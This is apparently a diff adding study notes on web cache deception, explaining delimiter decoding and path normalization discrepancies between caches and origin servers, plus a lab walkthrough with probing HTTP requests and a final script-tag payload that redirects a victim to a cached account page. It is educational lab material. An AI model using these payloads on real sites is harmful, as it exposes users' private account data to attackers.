@@ -245,3 +245,124 @@ To solve the lab craft an exploit and send it to victim to click on it:
 <script>document.location = "https://labid.web-security-academy.net/my-account;.js"</script>
 ```
 
+## Delimiter decoding discrepancies
+Websites sometimes need to send data in the URL that contains characters that have a special meaning within URLs, such as delimiters. To ensure these characters are interpreted as data, they are usually encoded. However, some parsers decode certain characters before processing the URL. If a delimiter character is decoded, it may then be treated as a delimiter, truncating the URL path.
+
+Differences in which delimiter characters are decoded by the cache and origin server can result in discrepancies in how they interpret the URL path, even if they both use the same characters as delimiters. Consider the example /profile%23wcd.css, which uses the URL-encoded # character:
+- The origin server decodes %23 to #. It uses # as a delimiter, so it interprets the path as /profile and returns profile information.
+- The cache also uses the # character as a delimiter, but doesn't decode %23. It interprets the path as /profile%23wcd.css. If there is a cache rule for the .css extension it will store the response.
+
+In addition, some cache servers may decode the URL and then forward the request with the decoded characters. Others first apply cache rules based on the encoded URL, then decode the URL and forward it to the next server. These behaviors can also result in discrepancies in the way cache and origin server interpret the URL path. Consider the example /myaccount%3fwcd.css:
+- The cache server applies the cache rules based on the encoded path /myaccount%3fwcd.css and decides to store the response as there is a cache rule for the .css extension. It then decodes %3f to ? and forwards the rewritten request to the origin server.
+- The origin server receives the request /myaccount?wcd.css. It uses the ? character as a delimiter, so it interprets the path as /myaccount.
+
+## Exploiting delimiter decoding discrepancies
+You may be able to exploit a decoding discrepancy by using an encoded delimiter to add a static extension to the path that is viewed by the cache, but not the origin server.
+
+Use the same testing methodology you used to identify and exploit delimiter discrepancies, but use a range of encoded characters. Make sure that you also test encoded non-printable characters, particularly %00, %0A and %09. If these characters are decoded they can also truncate the URL path. 
+
+# Exploiting static directory cache rules
+It's common practice for web servers to store static resources in specific directories. Cache rules often target these directories by matching specific URL path prefixes, like /static, /assets, /scripts, or /images. These rules can also be vulnerable to web cache deception. 
+
+## Normalization discrepancies
+Normalization involves converting various representations of URL paths into a standardized format. This sometimes includes decoding encoded characters and resolving dot-segments, but this varies significantly from parser to parser.
+
+Discrepancies in how the cache and origin server normalize the URL can enable an attacker to construct a path traversal payload that is interpreted differently by each parser. Consider the example /static/..%2fprofile:
+- An origin server that decodes slash characters and resolves dot-segments would normalize the path to /profile and return profile information.
+- A cache that doesn't resolve dot-segments or decode slashes would interpret the path as /static/..%2fprofile. If the cache stores responses for requests with the /static prefix, it would cache and serve the profile information.
+
+As shown in the above example, each dot-segment in the path traversal sequence needs to be encoded. Otherwise, the victim's browser will resolve it before forwarding the request to the cache. Therefore, an exploitable normalization discrepancy requires that either the cache or origin server decodes characters in the path traversal sequence as well as resolving dot-segments.
+
+## Detecting normalization by the origin server
+To test how the origin server normalizes the URL path, send a request to a non-cacheable resource with a path traversal sequence and an arbitrary directory at the start of the path. To choose a non-cacheable resource, look for a non-idempotent method like POST. For example, modify /profile to /aaa/..%2fprofile:
+- If the response matches the base response and returns the profile information, this indicates that the path has been interpreted as /profile. The origin server decodes the slash and resolves the dot-segment.
+- If the response doesn't match the base response, for example returning a 404 error message, this indicates that the path has been interpreted as /aaa/..%2fprofile. The origin server either doesn't decode the slash or resolve the dot-segment.
+
+> Note:
+>
+> When testing for normalization, start by encoding only the second slash in the dot-segment. This is important because some CDNs match the slash following the static directory prefix.
+> 
+> You can also try encoding the full path traversal sequence, or encoding a dot instead of the slash. This can sometimes impact whether the parser decodes the sequence. 
+
+## Detecting normalization by the cache server
+You can use a few different methods to test how the cache normalizes the path. Start by identifying potential static directories. In Proxy > HTTP history, look for requests with common static directory prefixes and cached responses. Focus on static resources by setting the HTTP history filter to only show messages with 2xx responses and script, images, and CSS MIME types.
+
+You can then choose a request with a cached response and resend the request with a path traversal sequence and an arbitrary directory at the start of the static path. Choose a request with a response that contains evidence of being cached. For example, /aaa/..%2fassets/js/stockCheck.js: 
+- If the response is no longer cached, this indicates that the cache isn't normalizing the path before mapping it to the endpoint. It shows that there is a cache rule based on the /assets prefix.
+- If the response is still cached, this may indicate that the cache has normalized the path to /assets/js/stockCheck.js.
+
+You can also add a path traversal sequence after the directory prefix. For example, modify /assets/js/stockCheck.js to /assets/..%2fjs/stockCheck.js:
+- If the response is no longer cached, this indicates that the cache decodes the slash and resolves the dot-segment during normalization, interpreting the path as /js/stockCheck.js. It shows that there is a cache rule based on the /assets prefix.
+- If the response is still cached, this may indicate that the cache hasn't decoded the slash or resolved the dot-segment, interpreting the path as /assets/..%2fjs/stockCheck.js.
+
+Note that in both cases, the response may be cached due to another cache rule, such as one based on the file extension. To confirm that the cache rule is based on the static directory, replace the path after the directory prefix with an arbitrary string. For example, /assets/aaa. If the response is still cached, this confirms the cache rule is based on the /assets prefix. Note that if the response doesn't appear to be cached, this doesn't necessarily rule out a static directory cache rule as sometimes 404 responses aren't cached. 
+
+> Note:
+>
+> It's possible that you may not be able to definitively determine whether the cache decodes dot-segments and decodes the URL path without attempting an exploit. 
+
+## Exploiting normalization by the origin server
+If the origin server resolves encoded dot-segments, but the cache doesn't, you can attempt to exploit the discrepancy by constructing a payload according to the following structure:
+```
+/<static-directory-prefix>/..%2f<dynamic-path>
+```
+
+For example, consider the payload /assets/..%2fprofile:
+- The cache interprets the path as: /assets/..%2fprofile
+- The origin server interprets the path as: /profile
+
+The origin server returns the dynamic profile information, which is stored in the cache. 
+
+### PRACTITIONER Lab: Exploiting origin server normalization for web cache deception
+The idea of the lab is to find discrepancies between URL parsers of the caching and origin servers
+
+First of all we need to figure out caching rules that the caching server uses for caching
+We start by making the request:
+```bash
+GET /resources/labheader/js/labHeader.js 
+```
+In the response we see:
+```bash
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+Content-Length: 1515
+```
+The response headers indicate that the response is cached.
+
+So now when we try:
+```bash
+GET /resources/labheader/aaa/..%2fjs/labHeader.js
+```
+We get 404 not found which means that the `..%2f` is not decoded and most likely dots are not resolved as path traversal. Because if they were decoded and resolved then we would get:
+```bash
+GET /resources/labheader/js/labHeader.js 
+```
+
+We also try:
+```bash
+GET /aaa/..%2fresources/labheader/js/labHeader.js
+```
+And we get a successful response with the contents of the labHeader.js file but the response is not cached:
+```bash
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 1515
+```
+This indicates that the origin server actually resolved `/aaa/..%2fresources/labheader/js/labHeader.js` into `/resources/labheader/js/labHeader.js` and returned a successful response but when that response got to the caching server, the parser on the caching server did not resolve URL to `resources/labheader/js/labHeader.js` it actually read it as `/aaa/..%2fresources/labheader/js/labHeader.js` and did not cache the response
+
+This means that the caching rule is not the following: `cache everything that ends with .js` but rather: `cache everything that starts with /resources`
+
+So now we know that:
+- The origin server resolves `..%2f`, i.e. it will interpret `/resources/..%2fmy-account` as `/my-account`
+- The caching rule on the caching server: `cache everything when URL starts with /resources`
+- The caching server does not resolve `..%2f`, i.e. it will interpret `/resources/..%2fmy-account` as `/resources/..%2fmy-account` but it will cache the response from the origin server because the url starts with `/resources`
+
+So we create an exploit for the victim:
+```bash
+<script>document.location = "https://labid.web-security-academy.net/resources/..%2fmy-account"</script>
+```
